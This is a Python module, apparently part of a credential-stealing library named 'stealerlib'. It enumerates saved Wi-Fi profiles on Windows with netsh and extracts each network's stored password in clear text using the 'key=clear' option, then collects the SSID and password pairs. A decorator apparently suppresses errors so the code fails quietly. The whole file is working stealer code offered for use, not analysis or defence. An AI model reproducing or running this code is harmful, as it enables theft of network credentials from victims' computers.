#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/wifi/__init__.py
"""

import subprocess

from stealerlib.exceptions import quiet


class WiFi:

    def __init__(self):
        self.ssids = []
        self.passwords = []
        self.credentials = []

    @quiet
    @staticmethod
    def get_wifi_profiles() -> list[str]:
        """Not implemented into get_passwords yet"""

        command_arguments = ['netsh', 'wlan', 'show', 'profiles']
        command_data = subprocess.check_output(command_arguments)
        command_data = command_data.decode('utf-8', errors="backslashreplace").split('\n')

        profiles = [
            p.split(":")[1][1:-1] for p in command_data if "All User Profile" in p
        ]

        return profiles

    @quiet
    @staticmethod
    def get_profile_info(profile: str) -> list[str]:
        """Not implemented into get_passwords yet"""

        command_arguments = ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
        command_data = subprocess.check_output(command_arguments)
        command_data = command_data.decode('utf-8', errors="backslashreplace").split('\n')

        info = [
            p.split(":")[1][1:-1] for p in command_data if "Key Content" in p
        ]

        return info

    @quiet
    def get_passwords(self):
        command_arguments = ['netsh', 'wlan', 'show', 'profiles']
        command_data = subprocess.check_output(command_arguments)
        command_data = command_data.decode('utf-8', errors="backslashreplace").split('\n')

        profiles = [
            p.split(":")[1][1:-1] for p in command_data if "All User Profile" in p
        ]

        for profile in profiles:
            try:
                command_arguments = ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
                command_data = subprocess.check_output(command_arguments)
                command_data = command_data.decode('utf-8', errors="backslashreplace").split('\n')

                profile_info = [
                    p.split(":")[1][1:-1] for p in command_data if "Key Content" in p
                ]
                try:
                    wifi_cred = profile_info[0]
                except IndexError:
                    wifi_cred = "No Password"
            except subprocess.CalledProcessError:
                wifi_cred = "Encoding Error"

            self.ssids.append(profile)
            self.passwords.append(wifi_cred)
            self.credentials.append((profile, wifi_cred))

